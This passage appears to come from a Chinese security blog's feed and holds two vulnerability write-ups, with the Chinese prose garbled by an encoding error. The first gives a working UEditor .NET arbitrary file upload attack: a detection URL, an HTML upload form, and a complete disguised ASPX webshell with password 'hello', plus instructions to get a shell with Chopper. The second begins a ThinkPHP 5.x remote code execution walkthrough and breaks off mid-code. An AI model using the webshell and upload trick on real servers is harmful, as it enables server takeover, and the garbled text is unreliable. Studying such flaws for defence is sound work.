        <content type="html"><![CDATA[<h1 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1943028-20200609111825976-1860145670.png"></p><p>UEditoråœ¨æŠ“å–è¿œç¨‹æ•°æ®æºçš„æ—¶ï¼Œä¼šè¿›å…¥â€catchimageâ€åˆ†æ”¯ã€‚åœ¨è¯¥æ–¹æ³•ä½¿ç”¨çš„CrawlerHandlerç±»ä¸­ï¼Œå¹¶æœªå¯¹æ–‡ä»¶ç±»å‹è¿›è¡ŒéªŒè¯ï¼Œä»è€Œå¯¼è‡´äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>æ¼æ´æ£€æµ‹</p><p>è®¿é—®å¦‚ä¸‹é“¾æ¥ ï¼š <a href="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&amp;encode=utf-8">http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&amp;encode=utf-8</a><br>å¦‚å‡ºç°</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917182153827.png" alt="image-20210917182153827"></p><p>åˆ™å¯å°è¯•æ¼æ´åˆ©ç”¨</p><p>æ¼æ´POC</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;www.XXXX.com.cn/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿å­˜å…¶ä¸ºhtmlæ–‡ä»¶ï¼Œactionä¸­çš„urlæ”¹ä¸ºæ£€æµ‹çš„é“¾æ¥ï¼Œæ‰“å¼€åä¸Šä¼ æ¡†è¾“å…¥è¿œç¨‹å›¾ç‰‡é©¬1.gifåœ°å€ï¼Œä¸Šä¼ æ—¶è·¯å¾„æœ€åæ”¹ä¸º1.gif?.aspx</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917182836547.png" alt="image-20210917182836547"></p><p>å›¾ç‰‡é©¬1.gifå†…å®¹å¦‚ä¸‹ï¼ˆå¯†ç ä¸ºhelloï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script runat&#x3D;&quot;server&quot; language&#x3D;&quot;JScript&quot;&gt;   function popup(str) &#123;       var q &#x3D; &quot;u&quot;;       var w &#x3D; &quot;afe&quot;;       var a &#x3D; q + &quot;ns&quot; + w; var b&#x3D; eval(str,a); return(b);  &#125;&lt;&#x2F;script&gt;&lt;% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String(&quot;UmVxdWVzdC5JdGVtWyJoZWxsbyJd&quot;)))); %&gt;</span><br></pre></td></tr></table></figure><p>æäº¤åå¯ä»¥çœ‹åˆ°è¿”å›äº†ä¸Šä¼ çš„å›¾ç‰‡é©¬çš„åœ°å€</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183134723.png" alt="image-20210917183134723"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183236500.png" alt="image-20210917183236500"></p><p> æ¥ä¸‹æ¥ä½¿ç”¨èœåˆ€è¿æ¥å³å¯getshell</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183609744.png" alt="image-20210917183609744"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183728147.png" alt="image-20210917183728147"></p><h1 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h1><ol><li>ä¿®æ”¹å·¥ç¨‹ç›®å½•ä¸‹net/App_Code/CrawlerHandler.csæ–‡ä»¶ï¼Œæ·»åŠ å¯¹æ–‡ä»¶ç±»å‹æ£€æŸ¥çš„ä»£ç ã€‚</li><li>ä½¿ç”¨å„ç±»WAFè½¯ä»¶ï¼Œé˜²æ­¢æ”»å‡»è€…ä¸Šä¼ æ¶æ„æ–‡ä»¶ã€‚</li><li>æ£€æŸ¥æ–‡ä»¶ä¸Šä¼ è·¯å¾„ä¸‹æ˜¯å¦æœ‰è¿‘æœŸä¸Šä¼ çš„ç•¸å½¢å›¾ç‰‡ï¼›æ£€æŸ¥æ˜¯å¦å­˜åœ¨aspï¼Œaspxç­‰ç±»å‹å±é™©æ–‡ä»¶ã€‚å¦‚æœå‘ç°å¼‚å¸¸æ–‡ä»¶ï¼Œè¯·åˆ¤æ–­ååŠæ—¶åˆ é™¤ã€‚</li></ol><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><blockquote><p><a href="https://cert.360.cn/warning/detail?id=15e86d6054f506af058657851a4783c3">https://cert.360.cn/warning/detail?id=15e86d6054f506af058657851a4783c3</a></p><p><a href="https://forum.butian.net/share/167">https://forum.butian.net/share/167</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.xè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</title>
      <link href="posts/3948.html"/>
      <url>posts/3948.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h1><p>Thinkphp5.xç‰ˆæœ¬ä¸­æ²¡æœ‰å¯¹è·¯ç”±ä¸­çš„æ§åˆ¶å™¨è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œåœ¨å­˜åœ¨adminã€indexæ¨¡å—ã€æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æ¡ä»¶ä¸‹ï¼ˆé»˜è®¤ä¸å¼€å¯ï¼‰ï¼Œå¯¼è‡´å¯ä»¥æ³¨å…¥æ¶æ„ä»£ç åˆ©ç”¨åå°„ç±»è°ƒç”¨å‘½åç©ºé—´å…¶ä»–ä»»æ„å†…ç½®ç±»ï¼Œå®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><p>å½±å“ç‰ˆæœ¬ï¼šThinkPHP v5.0.x &lt; 5.0.23ï¼ŒThinkPHP v5.1.x &lt; 5.1.31</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>é¦–å…ˆåœ¨/thinkphp/library/think/App.phpçš„run()ä¸»å‡½æ•°ä¸­ï¼Œurlä¼ å…¥åéœ€è¦ç»è¿‡è·¯ç”±æ£€æŸ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="variable">$dispatch</span>;</span><br><span class="line">           <span class="comment">// æœªè®¾ç½®è°ƒåº¦ä¿¡æ¯åˆ™è¿›è¡Œ URL è·¯ç”±æ£€æµ‹</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;</span><br><span class="line">               <span class="variable">$dispatch</span> = <span class="built_in">self</span>::routeCheck(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">           &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›self::routeCheckå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;path();</span><br><span class="line">        ........................</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥/thinkphp/library/think/Request.phpçš„path()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="variable">$suffix</span>   = Config::get(<span class="string">&#x27;url_html_suffix&#x27;</span>);</span><br><span class="line">            <span class="variable">$pathinfo</span> = <span class="keyword">$this</span>-&gt;pathinfo();</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›pathinfo()å‡½æ•°ï¼Œè¿™é‡Œè¿›è¡Œurlè§£æï¼Œè·å–è·¯ç”±ä¸­çš„å„ä¸ªéƒ¨åˆ†å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[Config::get(<span class="string">&#x27;var_pathinfo&#x27;</span>)])) &#123;</span><br><span class="line">              <span class="comment">// åˆ¤æ–­URLé‡Œé¢æ˜¯å¦æœ‰å…¼å®¹æ¨¡å¼å‚æ•°</span></span><br><span class="line">              <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = <span class="variable">$_GET</span>[Config::get(<span class="string">&#x27;var_pathinfo&#x27;</span>)];</span><br><span class="line">              <span class="keyword">unset</span>(<span class="variable">$_GET</span>[Config::get(<span class="string">&#x27;var_pathinfo&#x27;</span>)]);</span><br><span class="line">          &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">              <span class="comment">// CLIæ¨¡å¼ä¸‹ index.php module/controller/action/params/...</span></span><br><span class="line">              <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">1</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">1</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// åˆ†æPATHINFOä¿¡æ¯</span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">foreach</span> (Config::get(<span class="string">&#x27;pathinfo_fetch&#x27;</span>) <span class="keyword">as</span> <span class="variable">$type</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>])) &#123;</span><br><span class="line">                      <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] = (<span class="number">0</span> === strpos(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>], <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>])) ?</span><br><span class="line">                      substr(<span class="variable">$_SERVER</span>[<span class="variable">$type</span>], strlen(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>])) : <span class="variable">$_SERVER</span>[<span class="variable">$type</span>];</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]) ? <span class="string">&#x27;/&#x27;</span> : ltrim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pathinfo;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­var_pathinfoå‚æ•°å³ä¸ºç³»ç»Ÿé»˜è®¤å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºsï¼Œé€šè¿‡GETæ–¹æ³•å°†è·å–åˆ°çš„var_pathinfoçš„å€¼ï¼Œå³s=/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼â€¦]çš„å†…å®¹é€åˆ°routeCheck()å‡½æ•°ä¸­$pathå‚æ•°è¿›è¡Œè·¯ç”±æ£€æŸ¥å¤„ç†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;path();</span><br><span class="line">       ......</span><br><span class="line">           <span class="comment">// è·¯ç”±æ£€æµ‹ï¼ˆæ ¹æ®è·¯ç”±å®šä¹‰è¿”å›ä¸åŒçš„URLè°ƒåº¦ï¼‰</span></span><br><span class="line">           <span class="variable">$result</span> = Route::check(<span class="variable">$request</span>, <span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br><span class="line">           <span class="variable">$must</span> = !is_null(<span class="built_in">self</span>::<span class="variable">$routeMust</span>) ? <span class="built_in">self</span>::<span class="variable">$routeMust</span> : <span class="variable">$config</span>[<span class="string">&#x27;url_route_must&#x27;</span>];</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$must</span> &amp;&amp; <span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">               <span class="comment">// è·¯ç”±æ— æ•ˆ</span></span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> RouteNotFoundException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// è·¯ç”±æ— æ•ˆ è§£ææ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/å‚æ•°... æ”¯æŒæ§åˆ¶å™¨è‡ªåŠ¨æœç´¢</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">           <span class="variable">$result</span> = Route::parseUrl(<span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;controller_auto_search&#x27;</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è‹¥è·¯ç”±å¯»ä¸åˆ°å¯¹åº”æ“ä½œï¼Œå³è¿”å›<code>$result=false</code>ï¼Œä¸”å¼€å¯äº†å¼ºåˆ¶è·¯ç”±<code>$must</code>çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¹¶æœ€ç»ˆè¿›å…¥Route::parseUrlå‡½æ•°ï¼Œè¿›è¡Œ<code>$path</code>è§£æï¼Œä»¥ä¸Šå°±è¿›å…¥äº†æˆ‘ä»¬çš„æ¼æ´è§¦å‘ç‚¹ï¼š</p><p>/thinkphp/library/think/Route.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$depr</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$autoSearch</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$bind</span> = str_replace(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$depr</span>, <span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>]);</span><br><span class="line">        <span class="comment">// å¦‚æœæœ‰æ¨¡å—/æ§åˆ¶å™¨ç»‘å®š</span></span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$bind</span> . (<span class="string">&#x27;.&#x27;</span> != substr(<span class="variable">$bind</span>, <span class="number">-1</span>) ? <span class="variable">$depr</span> : <span class="string">&#x27;&#x27;</span>) . ltrim(<span class="variable">$url</span>, <span class="variable">$depr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$url</span>              = str_replace(<span class="variable">$depr</span>, <span class="string">&#x27;|&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$path</span>, <span class="variable">$var</span>) = <span class="built_in">self</span>::parseUrlPath(<span class="variable">$url</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œåœ¨è¯¥å‡½æ•°ä¸­è¿›è¡Œurlè§£æï¼Œç„¶åï¼Œè¿›å…¥åˆ°parseUrlPathå‡½æ•°ï¼Œæ ¹æ®/å¯¹åŒ…å«æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œçš„URLè¿›è¡Œåˆ†å‰²æˆæ•°ç»„ç„¶åè¿”å›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// åˆ†éš”ç¬¦æ›¿æ¢ ç¡®ä¿è·¯ç”±å®šä¹‰ä½¿ç”¨ç»Ÿä¸€çš„åˆ†éš”ç¬¦</span></span><br><span class="line">       <span class="variable">$url</span> = str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">       <span class="variable">$url</span> = trim(<span class="variable">$url</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">       <span class="variable">$var</span> = [];</span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$url</span>, <span class="string">&#x27;?&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// [æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ?]å‚æ•°1=å€¼1&amp;å‚æ•°2=å€¼2...</span></span><br><span class="line">           <span class="variable">$info</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">           <span class="variable">$path</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$info</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">           parse_str(<span class="variable">$info</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$var</span>);</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$url</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// [æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ]</span></span><br><span class="line">           <span class="variable">$path</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$path</span> = [<span class="variable">$url</span>];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> [<span class="variable">$path</span>, <span class="variable">$var</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆåœ¨parseUrl()å‡½æ•°ä¸­ï¼Œå°†è¿”å›çš„<code>$path</code>æå–å‡ºè·¯ç”±ï¼Œå³moduleã€controllerã€actionï¼Œç„¶åå°è£…åˆ°<code>$route</code>åè¿”å›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$route</span> = [<span class="variable">$module</span>, <span class="variable">$controller</span>, <span class="variable">$action</span>];</span><br><span class="line">        <span class="comment">// æ£€æŸ¥åœ°å€æ˜¯å¦è¢«å®šä¹‰è¿‡è·¯ç”±</span></span><br><span class="line">        <span class="variable">$name</span>  = strtolower(<span class="variable">$module</span> . <span class="string">&#x27;/&#x27;</span> . Loader::parseName(<span class="variable">$controller</span>, <span class="number">1</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$action</span>);</span><br><span class="line">        <span class="variable">$name2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$module</span>) || <span class="keyword">isset</span>(<span class="variable">$bind</span>) &amp;&amp; <span class="variable">$module</span> == <span class="variable">$bind</span>) &#123;</span><br><span class="line">            <span class="variable">$name2</span> = strtolower(Loader::parseName(<span class="variable">$controller</span>, <span class="number">1</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$action</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$rules</span>[<span class="string">&#x27;name&#x27;</span>][<span class="variable">$name</span>]) || <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$rules</span>[<span class="string">&#x27;name&#x27;</span>][<span class="variable">$name2</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;invalid request:&#x27;</span> . str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$depr</span>, <span class="variable">$url</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;module&#x27;</span>, <span class="string">&#x27;module&#x27;</span> =&gt; <span class="variable">$route</span>];</span><br></pre></td></tr></table></figure><p>å›åˆ°thinkphp/library/think/App.phpæ–‡ä»¶çš„run()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;</span><br><span class="line">               <span class="variable">$dispatch</span> = <span class="built_in">self</span>::routeCheck(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯</span></span><br><span class="line">           <span class="variable">$request</span>-&gt;dispatch(<span class="variable">$dispatch</span>);</span><br><span class="line">           <span class="comment">// è®°å½•è·¯ç”±å’Œè¯·æ±‚ä¿¡æ¯</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$debug</span>) &#123;</span><br><span class="line">               Log::record(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . var_export(<span class="variable">$dispatch</span>, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">               Log::record(<span class="string">&#x27;[ HEADER ] &#x27;</span> . var_export(<span class="variable">$request</span>-&gt;header(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">               Log::record(<span class="string">&#x27;[ PARAM ] &#x27;</span> . var_export(<span class="variable">$request</span>-&gt;param(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// ç›‘å¬ app_begin</span></span><br><span class="line">           Hook::listen(<span class="string">&#x27;app_begin&#x27;</span>, <span class="variable">$dispatch</span>);</span><br><span class="line">           <span class="comment">// è¯·æ±‚ç¼“å­˜æ£€æŸ¥</span></span><br><span class="line">           <span class="variable">$request</span>-&gt;cache(</span><br><span class="line">               <span class="variable">$config</span>[<span class="string">&#x27;request_cache&#x27;</span>],</span><br><span class="line">               <span class="variable">$config</span>[<span class="string">&#x27;request_cache_expire&#x27;</span>],</span><br><span class="line">               <span class="variable">$config</span>[<span class="string">&#x27;request_cache_except&#x27;</span>]</span><br><span class="line">           );</span><br><span class="line">           <span class="variable">$data</span> = <span class="built_in">self</span>::exec(<span class="variable">$dispatch</span>, <span class="variable">$config</span>);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>åœ¨å®ŒæˆRouteCheckåï¼Œè¿›å…¥åˆ°exec()å‡½æ•°ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$dispatch</span>, <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">switch</span> (<span 